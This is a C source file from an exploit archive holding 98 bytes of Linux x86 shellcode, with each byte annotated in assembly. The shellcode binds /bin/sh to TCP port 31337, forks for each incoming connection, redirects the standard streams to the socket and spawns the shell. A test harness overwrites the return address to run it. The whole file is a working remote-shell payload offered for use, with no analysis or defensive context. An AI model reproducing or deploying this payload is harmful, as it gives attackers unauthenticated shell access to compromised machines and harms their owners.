/*
 * (linux/x86) bind '/bin/sh' to 31337/tcp + fork() - 98 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x66"              // push $0x66
	"\x58"                  // pop %eax
	"\x99"                  // cltd
	"\x6a\x01"              // push $0x1
	"\x5b"                  // pop %ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x6a\x02"              // push $0x2

	//
	// <_doint>:
	//

	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80"              // int $0x80

	"\x5b"                  // pop %ebx
	"\x5d"                  // pop %ebp
	"\x52"                  // push %edx
	"\x66\xbd\x69\x7a"      // mov $0x7a69,%bp (0x7a69 = 31337)
	"\x0f\xcd"              // bswap %ebp
	"\x09\xdd"              // or %ebx,%ebp
	"\x55"                  // push %ebp
	"\x6a\x10"              // push $0x10
	"\x51"                  // push %ecx
	"\x50"                  // push %eax
	"\x89\xe1"              // mov %esp,%ecx
	"\xb0\x66"              // mov $0x66,%al
	"\xcd\x80"              // int $0x80
	"\xb3\x04"              // mov $0x4,%bl
	"\xb0\x66"              // mov $0x66,%al
	"\xcd\x80"              // int $0x80

	//
	// <_acceptloop>:
	//

	"\x5f"                  // pop %edi
	"\x50"                  // push %eax
	"\x50"                  // push %eax
	"\x57"                  // push %edi
	"\x89\xe1"              // mov %esp,%ecx
	"\x43"                  // inc %ebx
	"\xb0\x66"              // mov $0x66,%al
	"\xcd\x80"              // int $0x80
	"\x93"                  // xchg %eax,%ebx
	"\xb0\x02"              // mov $0x2,%al
	"\xcd\x80"              // int $0x80
	"\x85\xc0"              // test %eax,%eax
	"\x75\x1a"              // jne <_parent>
	"\x59"                  // pop %ecx

	//
	// <_dup2loop>:
	//

	"\xb0\x3f"              // mov $0x3f,%al
	"\xcd\x80"              // int $0x80
	"\x49"                  // dec %ecx
	"\x79\xf9"              // jns <_dup2loop>

	"\xb0\x0b"              // mov $0xb,%al
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f
	"\x89\xe3"              // mov %esp,%ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\xeb\xb2"              // jmp <_doint>

	//
	// <_parent>:
	//

	"\x6a\x06"              // push $0x6
	"\x58"                  // pop %eax
	"\xcd\x80"              // int $0x80
	"\xb3\x04"              // mov $0x4,%bl
	"\xeb\xc9";             // jmp <_acceptloop>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]